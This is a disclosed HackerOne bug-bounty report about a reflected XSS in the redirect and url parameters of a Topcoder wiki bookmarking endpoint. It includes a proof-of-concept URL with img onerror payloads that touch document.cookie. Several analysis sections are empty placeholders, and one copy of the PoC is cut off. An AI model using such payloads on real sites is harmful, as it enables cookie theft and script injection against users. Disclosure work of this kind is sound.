# Reflected XSS on https://apps.topcoder.com/wiki/plugins/socialbookmarking/updatebookmark.action

## Metadata
- **Source:** HackerOne
- **Report:** 866829 | https://hackerone.com/reports/866829
- **Submitted:** 2020-05-05
- **Reporter:** meryem0x
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** Cross-site Scripting (XSS) - Reflected
- **CVEs:** None
- **Category:** web-api

## Summary
## Summary:
Hi :) A reflected XSS occurs when creating bookmarks.

## Steps To Reproduce:

A user can create bookmarks on https://apps.topcoder.com/wiki/plugins/socialbookmarking/updatebookmark.action. In this url  `redirect` and `url` parameters are vulnerable to XSS.

PoC:
`https://apps.topcoder.com/wiki/plugins/socialbookmarking/updatebookmark.action?url=Asd"><img src=X onerror=alert(document.d

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

## Summary:
Hi :) A reflected XSS occurs when creating bookmarks.

## Steps To Reproduce:

A user can create bookmarks on https://apps.topcoder.com/wiki/plugins/socialbookmarking/updatebookmark.action. In this url  `redirect` and `url` parameters are vulnerable to XSS.

PoC:
`https://apps.topcoder.com/wiki/plugins/socialbookmarking/updatebookmark.action?url=Asd"><img src=X onerror=alert(document.domain)>&redirect=Asd"><img src=X onerror=alert(document.cookie)>`

{F816796}
{F816795}

## Impact

XSS can use to steal cookies or to run arbitrary code on victim's browser.

</details>

---
*Analysed by Claude on 2026-05-24*
